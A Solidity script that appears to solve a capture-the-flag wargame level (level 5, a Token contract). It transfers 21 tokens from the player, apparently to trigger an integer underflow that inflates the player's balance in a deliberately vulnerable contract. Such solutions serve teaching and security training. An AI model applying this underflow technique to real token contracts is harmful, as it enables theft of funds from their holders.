// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "./SolveLevelBase.sol";
import "../src/interfaces/IToken.sol";

contract SolveLevel5 is SolveLevelBase {
    function getInstanceCreationData()
        internal
        pure
        override
        returns (address levelAddress, uint256 value)
    {
        levelAddress = 0xbF361Efe3FcEc9c0139dEdAEDe1a76539b288935;
        value = 0;
    }

    function solveLevel(address instanceAddress, address player)
        internal
        override
    {
        IToken instance = IToken(instanceAddress);

        instance.transfer(instanceAddress, 21);
    }
}
